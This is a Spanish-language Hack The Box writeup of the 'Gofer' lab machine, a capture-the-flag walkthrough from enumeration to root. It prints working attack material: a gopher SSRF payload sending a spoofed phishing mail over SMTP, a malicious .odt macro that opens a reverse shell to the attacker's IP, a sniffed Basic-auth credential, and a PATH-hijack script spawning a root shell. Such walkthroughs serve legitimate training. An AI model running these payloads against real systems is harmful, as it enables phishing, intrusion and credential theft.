+++
author = "Andrés Del Cerro"
title = "Hack The Box: Gofer Writeup | Hard"
date = "2024-08-20"
description = ""
tags = [
    "HackTheBox",
    "Gofer",
    "Writeup",
    "Cybersecurity",
    "Penetration Testing",
    "CTF",
    "Reverse Shell",
    "Privilege Escalation",
    "RCE",
    "Exploit",
    "Linux",
    "SMB Enumeration",
    "Information Leakage",
    "Subdomain Fuzzing",
    "Server-Side Request Forgery",
    "Gopher",
    "Malicious ODT",
    "Phising",
    "Sniffing HTTP",
    "Abusing netdev group",
    "User Pivoting",
    "Abusing Role Overflow",
    "Path Hijacking",
    "Privilege Escalation"
]

+++

# Hack The Box: Gofer Writeup

Welcome to my detailed writeup of the hard difficulty machine **"Gofer"** on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.

# TCP Enumeration
```shell
$ rustscan -a 10.129.236.125 --ulimit 5000 -g
10.129.236.125 -> [22,80,139,445]
```

```shell
$ nmap -p22,80,139,445 -sCV 10.129.236.125 -oN allPorts
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-19 22:03 CEST
Nmap scan report for 10.129.236.125
Host is up (0.039s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 aa:25:82:6e:b8:04:b6:a9:a9:5e:1a:91:f0:94:51:dd (RSA)
|   256 18:21:ba:a7:dc:e4:4f:60:d7:81:03:9a:5d:c2:e5:96 (ECDSA)
|_  256 a4:2d:0d:45:13:2a:9e:7f:86:7a:f6:f7:78:bc:42:d9 (ED25519)
80/tcp  open  http        Apache httpd 2.4.56
|_http-title: Did not follow redirect to http://gofer.htb/
|_http-server-header: Apache/2.4.56 (Debian)
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: Host: gofer.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: GOFER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: -1h59m58s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-08-19T18:03:39
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.34 seconds
```

Vemos el dominio `gofer.htb`, así que lo añadimos al `/etc/hosts`.
También vemos expuesto el servicio de SMB.
# UDP Enumeration
```shell
$ sudo nmap --top-ports 1500 -sU --min-rate 5000 -n -Pn 10.129.236.125 -oN allPorts.UDP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-19 22:05 CEST
Nmap scan report for 10.129.236.125
Host is up (0.041s latency).
Not shown: 1493 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
137/udp   open   netbios-ns
217/udp   closed dbase
427/udp   closed svrloc
1027/udp  closed unknown
17205/udp closed unknown
31412/udp closed unknown
49190/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 0.79 seconds
```

# SMB Enumeration
```shell
$ smbmap -H 10.129.236.125 -u 'null'
[+] Guest session   	IP: 10.129.236.125:445	Name: gofer.htb                                         
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	shares                                            	READ ONLY	
	IPC$                                              	NO ACCESS	IPC Service (Samba 4.13.13-Debian)
```

Como invitado vemos un recurso compartido a nivel de red llamado `shares` en el cual tenemos permiso de escritura.

Vemos dentro un directorio `.backup`
```shell
$ smbclient \\\\10.129.236.125\\shares -U 'null' -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Oct 28 21:32:08 2022
  ..                                  D        0  Fri Apr 28 13:59:34 2023
  .backup                            DH        0  Thu Apr 27 14:49:32 2023

		5061888 blocks of size 1024. 2173452 blocks available
```

Y vemos un fichero `mail`
```shell
smb: \.backup\> dir
  .                                   D        0  Thu Apr 27 14:49:32 2023
  ..                                  D        0  Fri Oct 28 21:32:08 2022
  mail                                N     1101  Thu Apr 27 14:49:32 2023
```

Vemos un mensaje
```shell
$ cat mail
From jdavis@gofer.htb  Fri Oct 28 20:29:30 2022
Return-Path: <jdavis@gofer.htb>
X-Original-To: tbuckley@gofer.htb
Delivered-To: tbuckley@gofer.htb
Received: from gofer.htb (localhost [127.0.0.1])
        by gofer.htb (Postfix) with SMTP id C8F7461827
        for <tbuckley@gofer.htb>; Fri, 28 Oct 2022 20:28:43 +0100 (BST)
Subject:Important to read!
Message-Id: <20221028192857.C8F7461827@gofer.htb>
Date: Fri, 28 Oct 2022 20:28:43 +0100 (BST)
From: jdavis@gofer.htb

Hello guys,

Our dear Jocelyn received another phishing attempt last week and his habit of clicking on links without paying much attention may be problematic one day. That's why from now on, I've decided that important documents will only be sent internally, by mail, which should greatly limit the risks. If possible, use an .odt format, as documents saved in Office Word are not always well interpreted by Libreoffice.

PS: Last thing for Tom; I know you're working on our web proxy but if you could restrict access, it will be more secure until you have finished it. It seems to me that it should be possible to do so via <Limit>
```

En el mensaje vemos cosas interesantes, como que Jocelyn tiene el dedo suelto para clickear links, que hay un servicio de mensajería internamente, que como procesador ofimático utilizan libreoffice y que también Tom está trabajando en un web proxy.

# HTTP Enumeration
```shell
 whatweb gofer.htb
http://gofer.htb [200 OK] Apache[2.4.56], Bootstrap, Country[RESERVED][ZZ], Email[info@gofer.htb], Frame, HTML5, HTTPServer[Debian Linux][Apache/2.4.56 (Debian)], IP[10.129.236.125], Lightbox, Script, Title[Gofer]
```
El sitio web parece que no utiliza ningún CMS por detrás según whatweb.

![Write-up Image](images/Screenshot_1.png)
Viendo la página web en el apartado de `Team` vemos algunos nombres que habían sido mencionados en el mensaje, así que nos vamos a apuntar todos los nombres de usuario siguiendo el patrón de los usuarios del correo electrónico, primera letra del nombre y apellido.

Aprovechándonos de la capacidad de directory listing, podemos listar contenidos de la máquina y detectamos lo siguiente..
![Write-up Image](images/Screenshot_2.png)
Quizás se interprete código PHP.

Fuzzeando con `feroxbuster` tampoco encontré nada.
```shell
feroxbuster -u http://gofer.htb/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -d 1 -t 100 -x php
```

Al no encontrar nada, es hora de enumerar subdominios por si se está aplicando virtual hosting.

## Discovering Proxy VHOST
Con `wfuzz` podemos fuzzear subdominios y ocultando el código de estado 301 encontramos un subdominio nuevo. `proxy`
![Write-up Image](images/Screenshot_3.png)

Tiene sentido ya que antes en el mensaje se referían a un web proxy.

Añadimos `proxy.gofer.htb` al `/etc/hosts`

Y `whatweb` nos reporta algo distinto que antes
```shell
$ whatweb http://proxy.gofer.htb
http://proxy.gofer.htb [401 Unauthorized] Apache[2.4.56], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.56 (Debian)], IP[10.129.236.125], Title[401 Unauthorized], WWW-Authenticate[Restricted Content][Basic]
```

Para acceder este recurso me pide autenticación.
![Write-up Image](images/Screenshot_4.png)

Me lo pide para cualquier ruta por lo cual no podemos fuzzear.
![Write-up Image](images/Screenshot_5.png)

Probé a fuzzear con los métodos POST, PUT y OPTIONS (ya que a veces options suele tratarse como una solicitud de tipo GET -> HTTP Method Confusion)

```shell
feroxbuster -u http://proxy.gofer.htb -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -d 1 -t 100 -m POST,PUT,OPTIONS -x php
```

¡Y encontramos algo!
![Write-up Image](images/Screenshot_6.png)


```shell
$ curl -X POST http://proxy.gofer.htb/index.php && echo
<!-- Welcome to Gofer proxy -->
<html><body>Missing URL parameter !</body></html>
```

Si nos ponemos en escucha con `netcat` por el puerto 8081 y con el parámetro `url` ponemos nuestra dirección IP de atacante y especificamos el puerto 8081...

```shell
$ curl -X POST 'http://proxy.gofer.htb/index.php?url=http://10.10.14.133:8081' && echo
```

```shell
$ nc -lvnp 8081
listening on [any] 8081 ...
connect to [10.10.14.133] from (UNKNOWN) [10.129.236.125] 51384
GET / HTTP/1.1
Host: 10.10.14.133:8081
Accept: */*
```

En lo primero que pensé es en un Server Side Request Forgery pero vamos a probar algo mas obvio.

Quizás esto sea un proxy que esté alojado en un contenedor o algo así y mediante el parámetro URL carga el contenido de una página web desde el contendor y lo interpreta. Podríamos probar a ver si interpreta código PHP.

Y parece que no.
![Write-up Image](images/Screenshot_7.png)

En HackTricks empecé a probar cosas pero tiene una protección SSRF detrás.
```shell
$ curl -X POST 'http://proxy.gofer.htb/index.php?url=smtp://' && echo
<!-- Welcome to Gofer proxy -->
<html><body>Blacklisted keyword: smtp:// !</body></html>
```

## Abusing SSRF + Gopher Protocol
En HackTricks intentando saltarme la protección SSRF que tiene me encontré lo siguiente
https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
![Write-up Image](images/Screenshot_8.png)
Casualmente se parece mucho al nombre de la máquina así que podemos suponer que van por aquí los tiros.

Además, `gopher://` no está en la lista de palabras no permitidas.
```shell
$ curl -X POST 'http://proxy.gofer.htb/index.php?url=smtp://' && echo
<!-- Welcome to Gofer proxy -->
<html><body>Blacklisted keyword: smtp:// !</body></html>
┌─[192.168.1.52]─[pointedsec@parrot]─[~/Desktop/gofer/content/Gopherus]
└──╼ [★]$ curl -X POST 'http://proxy.gofer.htb/index.php?url=gopher://' && echo
<!-- Welcome to Gofer proxy -->
```

Podríamos utilizar [Gopherus](https://github.com/tarunkant/Gopherus) para generar payloads ya que lo que mas me llama la atención es que podemos intentar hacer SSRF a través de gopherus al protocolo SMTP.

Como esta herramienta está desarrollada en `python2`, vamos a utilizar un PR de un usuario llamado `Antabuse-123` el cual convierte la herramienta para utilizarla con `python3`

Primero clonamos el repositorio.
```shell
git clone https://github.com/tarunkant/Gopherus
```

Y luego actualizamos la rama a esta PR.
```shell
gh pr checkout 18
```

¡Y ya podemos utilizar la herramienta!
```shell
$ python3 gopherus3.py -h
usage: gopherus3.py [-h] [--exploit EXPLOIT]

options:
  -h, --help         show this help message and exit
  --exploit EXPLOIT  mysql, postgresql, fastcgi, redis, smtp, zabbix, pymemcache,
                     rbmemcache, phpmemcache, dmpmemcache
```

Queremos mandar un mensaje a `jhudson` que es Jocelyn, esta persona parece que es un poco despistada según el mail que hemos leido antes.

Este es el payload generado
```shell
gopher://127.0.0.1:25/_MAIL%20FROM:jdavis%40gofer.htb%0ARCPT%20To:jhudson%40gofer.htb%0ADATA%0AFrom:jdavis%40gofer.htb%0ASubject:Login%0AMessage:click%20here%20to%20login%20-%3E%20http://10.10.14.133:8081/testing%0A.
```

Con suerte, si el servidor SMTP está mal configurado este correo se enviará a `jhudson@gofer.htb` y si sigue siendo igual de descuidada deberíamos de ver una solicitud de este usuario a nuestro sitio web.

Pero tenemos un problema...
```shell
$ curl -X POST 'http://proxy.gofer.htb/index.php?url=gopher://127.0.0.1:25/_MAIL%20FROM:jdavis%40gofer.htb%0ARCPT%20To:jhudson%40gofer.htb%0ADATA%0AFrom:jdavis%40gofer.htb%0ASubject:Login%0AMessage:click%20here%20to%20login%20-%3E%20http://10.10.14.133:8081/testing%0A.' && echo
<!-- Welcome to Gofer proxy -->
<html><body>Blacklisted keyword: /127 !</body></html>
```

Después de probar varias cosas, detecté que `gofer.htb` no está en la lista negra y podremos cargar el recurso de la página principal.

![Write-up Image](images/Screenshot_10.png)

Después de probar un rato, el payload generado no funciona..

Probando una explotación mas manual, al intentar utilizar el SMTP a través de gopher..
![Write-up Image](images/Screenshot_9.png)
Vemos que se queda colgado, eso es bueno ya que está esperando el input para realizar alguna acción.

Leyendo este post de GitHub.
https://github.com/rhamaa/Web-Application-Attack/blob/master/other-vulnerability/service-side-request-forgery/ssrf-and-smtp.md

Después de un rato probando conseguí ver una respuesta del SMTP.
![Write-up Image](images/Screenshot_11.png)

Ahora que ya sabemos que esto funciona, podemos intentar mandar un correo.
Probando este payload de HackTricks.
![Write-up Image](images/Screenshot_12.png)

`gopher://gofer.htb:25/xHELO%20gofer.htb%250d%250aMAIL%20FROM%3A%3Cadmin@gofer.htb%3E%250d%250aRCPT%20TO%3A%3Cjhudson@gofer.htb%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a`

Parece ser que el correo se manda.
![Write-up Image](images/Screenshot_13.png)

# Foothold
> I've decided that important documents will only be sent internally, by mail, which should greatly limit the risks. If possible, use an .odt format, as documents saved in Office Word are not always well interpreted by Libreoffice.

Leyendo otra vez la nota, podríamos probar a mandar un documento .odt malicioso.

Primero, vamos a probar a ver si este usuario abre las direcciones que le pasamos.
Podemos probar a hacer un doble URL-Encode con [CyberChef](https://gchq.github.io/CyberChef/#recipe=URL_Decode(/disabled)URL_Decode(/disabled)URL_Encode(false)URL_Encode(false)&input=eEhFTE8gZ29mZXIuaHRiCk1BSUwgRlJPTTo8YWRtaW5AZ29mZXIuaHRiPgpSQ1BUIFRPOjxqaHVkc29uQGdvZmVyLmh0Yj4KREFUQQpGcm9tOiBbQWRtaW5dIDxhZG1pbUBnb2Zlci5odGI%2BClRvOiA8amh1ZHNvbkBnb2Zlci5odGI%2BCkRhdGU6IFR1ZSwgMTUgU2VwIDIwMTcgMTc6MjA6MjYgLTA0MDAKU3ViamVjdDogQ2hlY2sgdGhpcyBmaWxlIQpNZXNzYWdlOiBodHRwOi8vMTAuMTAuMTQuMTMzOjgwODEvdGVzdGluZwouClFVSVQ&oeol=CRLF) para generar nuestro payload

![Write-up Image](images/Screenshot_14.png)

¡Y esto tiene buena pinta!
```shell
$ python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.129.236.125 - - [20/Aug/2024 16:40:58] code 404, message File not found
10.129.236.125 - - [20/Aug/2024 16:40:58] "GET /testing HTTP/1.1" 404 -
```

Podemos utilizar este script de python para generar un documento `.odt` con un macro malicioso dentro el cual nos enviará una reverse shell a la dirección y puerto que especifiquemos.
https://github.com/0bfxgh0st/MMG-LO/blob/main/mmg-odt.py

Generamos el documento malicioso.
```shell
python3 odt.py linux 10.10.14.133 443
[+] Payload: linux reverse shell
[+] Creating malicious .odt file

Done.
```

Lo servimos por el puerto 8081
```shell
python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
```

Modificamos el payload.
![Write-up Image](images/Screenshot_15.png)

Y si nos ponemos en escucha con `pwncat-cs` por el puerto 443, ¡vemos que nos llega la consola interactiva!

Esto significa que el usuario `jhudson` al ser un poco distraído, ha descargado y abierto el documento adjuntado a través del correo que hemos enviado suplantando a `admin@gopher.htb` a través del Server Side Request Forgery que hemos explotado abusando del protocolo Gopher.
![Write-up Image](images/Screenshot_16.png)

Podríamos visualizar la flag de usuario..
```shell
(remote) jhudson@gofer.htb:/home/jhudson$ cat user.txt
b185c3fc3024bb...
```

# User Pivoting
Algo raro que detectamos es que el usuario `jhudson` pertenece al grupo `netdev`

```shell
(remote) jhudson@gofer.htb:/home/jhudson$ id
uid=1000(jhudson) gid=1000(jhudson) groups=1000(jhudson),108(netdev)
```

> netdev: Members of this group can **manage network interfaces through the network manager and wicd**. cdrom: This group can be used locally to give a set of users access to a CDROM drive and other optical drives

Los usuarios de este grupo pueden gestionar las interfaces de red el equipo. Vamos a tener eso en cuenta.

Si recordamos, se requería de autenticación para acceder al proxy, era una autenticación de tipo Basic por lo cual esa credencial se debe de almacenar en algún archivo en el sistema.

En el archivo `/etc/apache2/sites-enabled/000-default.conf`

Encontramos lo siguiente
```xml
<Directory "/var/www/proxy">
    DirectoryIndex index.php index.html
    Options Indexes FollowSymLinks MultiViews
    <Limit GET>
        AuthType Basic
        AuthName "Restricted Content"
        AuthUserFile /etc/apache2/.htpasswd
        Require valid-user
    </Limit>
  </Directory>
```

Vemos un hash correspondiente al usuario `tbuckley`
```shell
(remote) jhudson@gofer.htb:/etc/apache2/sites-enabled$ cat /etc/apache2/.htpasswd
tbuckley:$apr1$YcZb9OIz$fRzQMx20VskXgmH65jjLh/
```

Después de un rato intentando romper el hash no lo conseguí.
```shell
.\hashcat.exe -a 0 -m 1600 .\hash.txt .\rockyou.txt
```

Me di cuenta de que la máquina tenía la herramienta `tcpdump` instalada, y me dio por analizar si existía tráfico que podíamos capturar a través de cualquier interfaz de red de la máquina.

```shell
tcpdump -i any
....
tcpdump -i any
tcpdump: data link type LINUX_SLL2
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
14:05:10.923452 eth0  In  IP 10.10.14.133.https > 10.129.236.125.43690: Flags [.], ack 851516718, win 814, options [nop,nop,TS val 1107706382 ecr 3004325324], length 0
14:05:10.923476 eth0  Out IP 10.129.236.125.43690 > 10.10.14.133.https: Flags [P.], seq 1:200, ack 0, win 501, options [nop,nop,TS val 3004325360 ecr 1107706382], length 199
14:05:10.959254 eth0  In  IP 10.10.14.133.https > 10.129.236.125.43690: Flags [.], ack 200, win 835, options [nop,nop,TS val 1107706417 ecr 3004325360], length 0
```
Y vemos que hay tráfico.
Si se hiciera un solicitud HTTP podríamos capturarla y analizarla, así que primero vamos a confirmar si se hace alguna solicitud HTTP.

Para ello utilizamos el parámetro -A y filtramos por paquetes TCP y cuyo destinatario/origen sea el puerto 80 (HTTP).

```shell
tcpdump -i any -A 'tcp port 80'
...
14:08:01.496889 lo    In  IP localhost.49924 > localhost.http: Flags [S], seq 1942583195, win 65495, options [mss 65495,sackOK,TS val 384437704 ecr 0,nop,wscale 7], length 0
E..<..@.@..............Ps.w..........0.........
............
14:08:01.496900 lo    In  IP localhost.http > localhost.49924: Flags [S.], seq 3474896210, ack 1942583196, win 65483, options [mss 65495,sackOK,TS val 384437704 ecr 384437704,nop,wscale 7], length 0
E..<..@.@.<..........P.....Rs.w......0.........
............
14:08:01.496908 lo    In  IP localhost.49924 > localhost.http: Flags [.], ack 1, win 512, options [nop,nop,TS val 384437704 ecr 384437704], length 0
E..4..@.@..............Ps.w....S.....(.....
.......
14:08:01.496945 lo    In  IP localhost.49924 > localhost.http: Flags [P.], seq 1:164, ack 1, win 512, options [nop,nop,TS val 384437704 ecr 384437704], length 163: HTTP: GET /?url=http://gofer.htb HTTP/1.1
E.....@.@..n...........Ps.w....S...........
........GET /?url=http://gofer.htb HTTP/1.1
Host: proxy.gofer.htb
Authorization: Basic dGJ1Y2tsZXk6b29QNGRpZXRpZTNvX2hxdWFldGk=
User-Agent: curl/7.74.0
Accept: */*


14:08:01.496958 lo    In  IP localhost.http > localhost.49924: Flags [.], ack 164, win 511, options [nop,nop,TS val 384437704 ecr 384437704], length 0
E..4..@.@.U..........P.....Ss.x?.....(.....
.......
14:08:01.498364 lo    In  IP localhost.49932 > localhost.http: Flags [S], seq 546175604, win 65495, options [mss 65495,sackOK,TS val 384437706 ecr 0,nop,wscale 7], length 0
E..<`;@.@..~...........P ..t.........0.........
............
14:08:01.498371 lo    In  IP localhost.http > localhost.49932: Flags [S.], seq 903951867, ack 546175605, win 65483, options [mss 65495,sackOK,TS val 384437706 ecr 384437706,nop,wscale 7], length 0
E..<..@.@.<..........P..5.5. ..u.....0.........
............
14:08:01.498376 lo    In  IP localhost.49932 > localhost.http: Flags [.], ack 1, win 512, options [nop,nop,TS val 384437706 ecr 384437706], length 0
E..4`<@.@..............P ..u5.5......(.....
.......
14:08:01.498395 lo    In  IP localhost.49932 > localhost.http: Flags [P.], seq 1:49, ack 1, win 512, options [nop,nop,TS val 384437706 ecr 384437706], length 48: HTTP: GET / HTTP/1.1
E..d`=@.@..T...........P ..u5.5......X.....
........GET / HTTP/1.1
Host: gofer.htb
Accept: */*


14:08:01.498405 lo    In  IP localhost.http > localhost.49932: Flags [.], ack 49, win 512, options [nop,nop,TS val 384437706 ecr 384437706], length 0
E..4=.@.@............P..5.5. ........(.....
.......
14:08:01.498608 lo    In  IP localhost.http > localhost.49932: Flags [P.], seq 1:29636, ack 49, win 512, options [nop,nop,TS val 384437706 ecr 384437706], length 29635: HTTP: HTTP/1.1 200 OK
E.s.=.@.@............P..5.5. .......q......
........HTTP/1.1 200 OK
Date: Tue, 20 Aug 2024 13:08:01 GMT
Server: Apache/2.4.56 (Debian)
Last-Modified: Fri, 28 Apr 2023 14:21:26 GMT
ETag: "72c4-5fa66303d293d"
Accept-Ranges: bytes
Content-Length: 29380
Vary: Accept-Encoding
Content-Type: text/html

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">

  <title>Gofer</title>
  <meta content="" name="description">
  <meta content="" name="keywords">

  <!-- Favicons -->
  <link href="assets/img/favicon.png" rel="icon">
  <link href="assets/img/apple-touch-icon.png" rel="apple-touch-icon">

  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">

  <!-- Vendor CSS Files -->
  <link href="assets/vendor/aos/aos.css" rel="stylesheet">
  <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
  <link href="assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
  <link href="assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
  <link href="assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">

  <!-- Template Main CSS File -->
  <link href="assets/css/style.css" rel="stylesheet">

  <!-- =======================================================
  * Template Name: Maxim - v4.9.1
  * Template URL: https://bootstrapmade.com/maxim-free-onepage-bootstrap-theme/
  * Author: BootstrapMade.com
  * License: https://bootstrapmade.com/license/
  ======================================================== -->
</head>

<body>

  <!-- ======= Header ======= -->
  <header id="header" class="fixed-top d-flex align-items-center">
    <div class="container d-flex justify-content-between">

      <div class="logo">
        <h1><a href="index.html">Gofer</a></h1>
        <!-- Uncomment below if you prefer to use an image logo -->
        <!-- <a href="index.html"><img src="assets/img/logo.png" alt="" class="img-fluid"></a>-->
................
```
Y de repente surgió un "churraco" que era la solicitud y la respuesta íntegra de una petición.

Podemos ver en las cabeceras de la petición algo interesante.
![Write-up Image](images/Screenshot_17.png)

**dGJ1Y2tsZXk6b29QNGRpZXRpZTNvX2hxdWFldGk=**

¡Y parece que son las credenciales de `tbuckley` codificadas en base64!
```shell
echo "dGJ1Y2tsZXk6b29QNGRpZXRpZTNvX2hxdWFldGk=" | base64 -d && echo 
tbuckley:ooP4dietie3o_hquaeti
```

¡Y conseguimos migrar a este usuario!
```shell
(remote) jhudson@gofer.htb:/tmp$ su tbuckley
Password: 
tbuckley@gofer:/tmp$ id
uid=1002(tbuckley) gid=1002(tbuckley) groups=1002(tbuckley),1004(dev)
```

# Privilege Escalation

Detectamos un binario con el bit de SUID cuyo propietario es `root` y puede ejecutarlo los usuarios del grupo `dev` y antes hemos visto que `tbuckley` pertenece a este grupo.
```shell
tbuckley@gofer:~$ find / \-perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/passwd
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/pkexec
/usr/bin/su
/usr/bin/chfn
/usr/bin/newgrp
/usr/local/bin/notes
tbuckley@gofer:~$ ls -la /usr/local/bin/notes
-rwsr-s--- 1 root dev 17168 Apr 28  2023 /usr/local/bin/notes
```

Viendo un poco que hace este binario, si probamos a ver si se acontece un BoF pasa lo siguiente.
![Write-up Image](images/Screenshot_18.png)
![Write-up Image](images/Screenshot_19.png)

El nombre de usuario se "recorta", esto me gusta ya que probablemente se estén jugando con tamaños del buffer pequeños. 

Al seguir investigando me di cuenta de que podías crear una nota sin crear un usuario.
![Write-up Image](images/Screenshot_20.png)

Si creamos un usuario y lo borramos nos reporta algo distinto, como si el usuario simplemente no tenga nombre, es decir, no nos reporta que debemos crear un usuario.
![Write-up Image](images/Screenshot_21.png)

Si ahora creamos una nota teniendo esta condición y revisamos el usuario, vemos que podemos sobrescribir tanto el nombre de usuario como el rol.
![Write-up Image](images/Screenshot_22.png)

Hay otros problemas con este binario y otros desbordamientos graves pero este es el que me interesa introducir en el write-up ya que podemos cambiar el rol que tenemos y ¿para qué?

Esta es la opción número 8 para realizar un backup.
![Write-up Image](images/Screenshot_23.png)

Nos pide el rol de admin.

# Role Overflow
Vamos a utilizar este repositorio de Github para crear un patrón de forma automática y saber cuantos caracteres (offset) necesitamos para reemplazar el rol.
https://github.com/Svenito/exploit-pattern

También podríamos utilizar los módulos en `perl` que vienen con `metasploit`, pero prefiero hacerlo de esta manera.

Generamos el patrón.
```shell
$ python3 pattern.py 50
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab
```

Ahora al repetir el proceso, en vez de introducir `A` introducimos el patrón creado y copiamos la secuencia que se encuentra en el campo `Role`
![Write-up Image](images/Screenshot_24.png)

Y ya tenemos el offset.
```shell
python3 pattern.py Aa8Aa9Ab0Ab1Ab2
Pattern Aa8Aa9Ab0Ab1Ab2 first occurrence at position 24 in pattern.
```

Ahora generamos el "payload" para cambiar nuestro rol.
```shell
$ python3
Python 3.11.2 (main, May  2 2024, 11:59:08) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> print("A"*24 + "admin")
AAAAAAAAAAAAAAAAAAAAAAAAadmin
```

Y conseguimos cambiar nuestro rol a admin en el binario.
![Write-up Image](images/Screenshot_25.png)

# Path Hijacking -> Privesc
Ahora al intentar hacer el backup vemos que se utiliza `tar` y hace una copia de `/opt/notes`
![Write-up Image](images/Screenshot_26.png)

Y si con `strings` listamos las cadenas imprimibles de caracteres y filtramos por `tar` vemos el comando que se utiliza.
```shell
tbuckley@gofer:~$ strings /usr/local/bin/notes | grep tar
__libc_start_main
__gmon_start__
tar -czvf /root/backups/backup_notes.tar.gz /opt/notes
__init_array_start
__libc_start_main@GLIBC_2.2.5
__data_start
__gmon_start__
__bss_start
```

Desgraciadamente la persona que hizo el binario asignó una ruta relativa a este binario con SUID.

Esto significa que se asigna el SUID 0 `root` pero utiliza el PATH de nuestro usuario, y podríamos hacer un Path Hijacking para que al ejecutar el comando `tar` de forma relativa se ejecute un comando que nosotros especifiquemos como el usuario `root`

Nos dirigimos la directorio `/tmp` por ejemplo y creamos un archivo `tar` y le asignamos permisos de ejecución.

```shell
tbuckley@gofer:/tmp$ cat tar
#!/bin/bash

bash -p

tbuckley@gofer:/tmp$ chmod +x tar
```

Ahora reemplazamos el path para que la primera coincidencia al buscar el binario de `tar` se realice en `/tmp`

```shell
tbuckley@gofer:/tmp$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
tbuckley@gofer:/tmp$ export PATH=/tmp:$PATH
tbuckley@gofer:/tmp$ echo $PATH
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

Ahora cuando ejecutemos el comando `tar` se ejecutará nuestro script recién creado siempre que en el path se realice la primera coincidencia en la ruta en la que hemos creado nuestro script malicioso.

Podemos comprobar revisando el PID de la bash que tenemos y podemos ver que al ejecutar `tar` cambia, esto significa que se está ejecutando correctamente el `bash -p` del script.
```shell
tbuckley@gofer:/tmp$ echo $$
25146
tbuckley@gofer:/tmp$ tar
tbuckley@gofer:/tmp$ echo $$
25942
```

Ahora realizamos de nuevo el proceso para convertirnos administradores...
Creamos un usuario -> Lo borramos -> Creamos una nota con el patrón creado anteriormente (AAAAAAAAAAAAAAAAAAAAAAAAadmin) 

```shell
Your choice: 2


Username: AAAAAAAAAAAAAAAAAAAAAAAAadmin
Role: admin
```

Y al ejecutar la opción 8...
```shell
Your choice: 8

Access granted!
root@gofer:/tmp# id
uid=0(root) gid=0(root) groups=0(root),1002(tbuckley),1004(dev)
```

Nos convertimos en `root` y ya podemos leer su flag.
```shell
root@gofer:/root# cat root.txt
f779f67c2b1f8b....
```

¡Y ya estaría!

Happy Hacking! 🚀